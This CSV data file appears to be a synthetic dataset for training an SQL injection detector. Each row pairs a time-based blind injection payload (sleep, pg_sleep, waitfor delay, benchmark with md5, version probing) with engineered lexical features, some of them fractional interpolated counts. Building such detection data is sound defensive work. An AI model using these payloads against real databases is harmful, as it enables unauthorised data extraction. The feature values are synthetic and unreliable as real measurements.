id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000928,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.8494461286770315,87.35130541968567,27.648694580314324,3.500524791139577,17.229568968899862,21.351305419685673,37.47304187047149,11.297389160628649,0.19699749626492538,0.2443737773084405,0.4291366442958755,0.1294920821307587,0.8243472901571623,0.0,0.0,0.0,0.0,1.0,0.0,6.824347290157163,0.8243472901571622,0.0,1.0,0.9999999999999999,0.8243472901571622,0.0,0.0,0.8243472901571622,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.1756527098428377,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1756527098428378
SMOTE_000929,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9345525367395058,34.06513504096417,23.172094586747015,4.315140188180188,16.0,2.0,3.7209458674701423,12.344189173494028,0.4765325563526799,0.059566569544084985,0.09867897562295186,0.3652218984802833,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.344189173494029,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.17209458674701428,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000930,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.1132416596560408,33.0,17.0,3.504123773197531,13.0,0.4383190418600842,10.0,9.561680958139917,0.3939393939393939,0.013282395207881353,0.30303030303030304,0.28974790782242166,1.1102230246251565e-16,0.5616809581399158,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.5616809581399158,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000931,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.565215056497301,32.846821345039544,19.50578057644552,3.967966863389008,14.252890288222758,3.164739807851494,5.923410672519772,9.505780576445519,0.4433779225803978,0.1066492226123145,0.16656876614536148,0.2834040886619261,2.5823699039257466,0.0,2.0,0.0,0.0,0.0,0.0,0.8352601921485063,1.3877787807814457e-17,1.6705203842970129,0.4176300960742531,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.41763009607425305,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000932,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.08407303503434552,49.35235689393393,20.0,3.2936057273647124,13.0,10.35235689393393,20.0,6.0,0.26343647362402406,0.20969057912792785,0.40528688249849854,0.12158606474954956,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000933,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.17807288212771388,84.89889669444213,20.0,2.9503257693395284,27.03370110185262,2.0,42.96629889814738,12.898896694442136,0.31844969625646125,0.023558422756257635,0.506095100212556,0.1518967807747251,0.9662988981473791,0.0,0.0,0.0,1.0,0.0,0.0,9.0,0.9662988981473791,0.0,0.0,0.9999999999999999,0.9662988981473791,0.0,0.0,0.966298898147379,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.033701101852620846,0.966298898147379,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000934,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,2.0872922427140015,97.41871626629496,27.9418716266295,3.7736600205321174,24.296550693203237,28.058128373370508,35.65122975977698,9.412807439944245,0.24834842375943716,0.29208465121359956,0.36350449609338437,0.0960624289335789,1.1102230246251565e-16,0.4709358133147483,0.0,0.0,0.0,2.0,0.0,4.941871626629497,1.3877787807814457e-17,0.0,1.0,2.0,0.0,0.4709358133147483,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.5290641866852517,0.4709358133147483,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000935,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.06527392204652516,42.388049185080604,16.1293497283602,3.072884640576453,13.0,0.1293497283602001,18.2586994567204,11.0,0.30685468814494826,0.0028744384080044566,0.4306245988628603,0.259646274584187,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000936,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.33657069380574667,24.447810404597867,13.29854026973191,3.1921163070346927,9.29854026973191,0.0,8.149270134865954,7.0,0.37983745807435965,1.3877787807814457e-17,0.3333333333333333,0.286829208592307,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.14927013486595508,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.149270134865955
SMOTE_000937,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.5833429163172243,35.89073317990007,23.445366589950034,4.292419065115625,16.0,2.0,5.445366589950037,12.445366589950035,0.4461376595533582,0.05576720744416978,0.1514549534739389,0.3466401795285331,2.0,0.44536658995003486,2.0,0.0,0.0,0.0,0.4453665899500349,0.9999999999999996,1.3877787807814457e-17,4.0,0.5546334100499651,2.0,1.0,0.44536658995003486,1.0,0.0,0.0,0.0,1.0,0.4453665899500349,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000938,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.2964723621909306,37.07464841121954,23.42288736760163,4.227906714126799,16.0,2.0,6.228873676016285,12.845774735203257,0.44233354078159615,0.05529169259769951,0.151402457961706,0.35097230865899837,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.8457747352032574,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.4228873676016286,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000939,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,1.921439455283464,92.55598188123483,23.434537218743106,3.1141297503199765,29.747629774994486,4.747629774994484,45.06072233124586,13.0,0.32089466960760754,0.04754662640044656,0.48941772152422214,0.14214098246772372,1.0,0.0,0.0,0.0,1.0,0.34345372187431045,0.0,9.0,0.6565462781256896,0.0,0.0,1.3434537218743103,1.0,0.0,0.0,1.0,0.0,0.34345372187431045,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.34345372187431045,1.0,0.0,0.6565462781256894,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000940,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.7149208550277899,114.37751120980352,26.048311131430133,3.225801639385939,36.50448892081878,8.912355578777296,55.096622262860265,13.864044447347162,0.3190992343652893,0.07580773126806359,0.4826475442730175,0.12244549009362957,1.0,0.0,0.0,0.0,1.0,0.864044447347162,0.0,9.864044447347162,0.13595555265283799,0.0,0.0,1.864044447347162,1.0,0.0,0.0,1.0,0.0,0.864044447347162,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8640444473471621,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.864044447347162
SMOTE_000941,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.22009849199709874,42.656504253963945,23.228483345374336,4.0698177681271375,17.199537563215273,2.114241672687169,10.342725018061504,13.0,0.39814528642104635,0.04925815333527737,0.24302671888532484,0.30956984135835147,2.1142416726871684,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,3.828637490969247,1.0,2.057120836343584,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000942,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.023486584322546775,61.10783356989836,20.0,2.9687436842633415,13.0,10.107833569898357,30.0,8.0,0.212744094022031,0.16538855422126286,0.49094790928161003,0.13091944247509602,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000943,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.31050020668829725,59.0442944351602,20.0,3.026494980052302,13.0,10.177791414985437,28.222085850145632,7.644417170029127,0.22145054830915323,0.1739024039221343,0.4754814438701894,0.129165603898523,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,5.644417170029127,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000944,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.2692547154119996,33.76722835461411,16.74425721512863,3.449092809206078,13.0,0.7442572151286297,10.767228354614112,9.25574278487137,0.38554379746634393,0.022553248943291818,0.31788405063646846,0.2740189029538958,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.2557427848713703,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000945,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.7057582846317643,29.975692320183505,16.0,3.328462781554296,11.0,0.0,10.780553856146804,8.195138464036702,0.3684253392271617,1.3877787807814457e-17,0.35788959292740596,0.27368506784543234,1.1102230246251565e-16,1.1951384640367015,0.0,0.0,0.0,0.19513846403670143,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.19513846403670154,0.0,1.0,0.0,0.8048615359632985,0.0,0.1951384640367015,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000946,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.14075214504399092,88.94178913798414,26.058210862015855,3.575815748632518,22.796261982944507,22.941789137984145,35.08731629302378,8.11642172403171,0.25625806099811776,0.2579307869181136,0.39452518794390695,0.09128596413986169,0.029105431007927507,0.0,0.0,0.0,0.0,1.0,0.0,6.0291054310079275,0.029105431007927535,0.0,1.0,0.9999999999999999,0.029105431007927562,0.0,0.0,0.029105431007927396,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9708945689920725,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9708945689920725
SMOTE_000947,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0047047837860450595,100.0,33.0,4.068713469978714,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000948,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.5411893249094013,36.31121923532186,17.0,3.3854394335071385,13.0,1.0,12.75934936276821,9.551869872553642,0.3649522895224349,0.028073253040187318,0.3420514051300555,0.2649230523073222,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.551869872553642,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000949,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.4400357839357403,26.851140213900628,14.710684128340372,3.281979420994001,10.140456085560247,0.0,9.140456085560249,7.5702280427801245,0.3774578794947419,1.3877787807814457e-17,0.33988767865264513,0.282654441852613,1.1102230246251565e-16,0.5702280427801244,0.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.5702280427801243,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5702280427801243,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5702280427801243
SMOTE_000950,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.9423205738292538,71.66685810014263,24.047755785816168,3.4272795941384984,15.047755785816168,16.47640925730587,30.761795371347063,9.380897685673531,0.20917734386930226,0.22847123909936923,0.4308022663146651,0.13154915071666337,1.0,0.0,0.0,0.0,0.0,1.809551157163234,0.0,4.380897685673532,0.19044884283676622,0.0,1.0,1.8095511571632337,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8095511571632338,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.809551157163234
SMOTE_000951,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.9267960939095224,47.58503220999056,17.598239083528302,3.0883412198456863,10.200880458235849,7.991195417641505,21.991195417641507,7.401760916471699,0.22168084271633376,0.1566901062282648,0.45877173775083235,0.16285731330456907,1.1102230246251565e-16,1.2008804582358497,0.0,0.0,0.0,1.0,0.0,3.598239083528301,1.3877787807814457e-17,0.8035218329433983,0.7991195417641505,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000952,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.959739289846786,37.541651990055314,16.0,3.0272463273690335,11.0,0.7118043325046095,17.11804332504609,8.71180433250461,0.30028749210209554,0.017361081280600238,0.44659944198972545,0.2357519846275788,1.1102230246251565e-16,0.28819566749539083,0.0,0.0,0.0,0.0,0.0,3.423608665009218,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.2881956674953908,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000953,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.8777783678557911,88.45182744375349,21.569012474433404,3.0255529175634788,28.255209979546724,3.2552099795467235,43.94140748466005,13.0,0.3191306769961657,0.034501285692574435,0.49836075383339234,0.14800728347786746,1.0,0.0,0.0,0.0,1.0,0.1569012474433405,0.0,9.0,0.8430987525566594,0.0,0.0,1.1569012474433404,1.0,0.0,0.0,1.0,0.0,0.15690124744334039,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.15690124744334044,1.0,0.0,0.8430987525566596,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000954,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.1307580340250073,35.6274112743242,16.12419624189193,3.3156675275980096,13.0,0.12419624189193179,12.627411274324206,9.875803758108068,0.3651882604661493,0.003763522481573689,0.3538976930214282,0.27715052403084883,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.875803758108068,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000955,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.1350430851055113,49.67557311207251,17.470229244829003,2.988771771476097,10.264885377585497,7.3511462241450225,24.0,8.05954151034199,0.20748227755163481,0.14414012204205928,0.48413735946728886,0.16424024093901704,1.1102230246251565e-16,1.2648853775854976,0.0,0.0,0.0,1.0,0.0,4.0,1.3877787807814457e-17,1.0595415103419907,0.7351146224145022,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000956,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.14957744479213098,37.8618055669058,16.0,2.9775819243409525,11.0,0.0,17.71817130575483,9.143634261150966,0.29133886785923085,1.3877787807814457e-17,0.4669526358739976,0.2417084962667716,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.1436342611509662,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000957,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.6241414304236749,35.29708752940789,16.234304156864034,3.3393606484305347,13.0,0.0,12.297087529407893,10.0,0.368802914240486,1.3877787807814457e-17,0.3475025363437555,0.2836945494157585,1.1102230246251565e-16,0.23430415686403577,2.0,0.0,0.0,0.0,0.0,2.7656958431359637,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.23430415686403572,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000958,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,2.0485769372180536,63.72412722562849,20.931109420600542,3.1451406956081907,13.310473292458074,10.0,30.41365393317042,10.0,0.2094814033881527,0.15693420826977061,0.4766501800723061,0.15693420826977061,1.551745548743012,0.0,0.0,0.0,0.0,1.0,0.0,5.172381676885482,1.3877787807814457e-17,0.0,0.7241272256284939,1.5517455487430123,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2758727743715062,0.27587277437150626,0.0,0.27587277437150615,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5517455487430123
SMOTE_000959,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.6601104707464628,109.20962359451786,30.19214118213199,3.4565804395783575,36.53712945705591,10.0,49.288211773197986,13.384282364263978,0.33336707592356984,0.09186942947913884,0.4523772180877648,0.12238627650952648,1.1921411821319885,0.0,0.0,0.0,1.0,1.0,0.0,9.0,1.3877787807814457e-17,0.0,0.0,2.1921411821319885,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.09607059106599423,2.0960705910659945,0.0,1.0,1.0960705910659942,0.09607059106599425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.2882117731979825
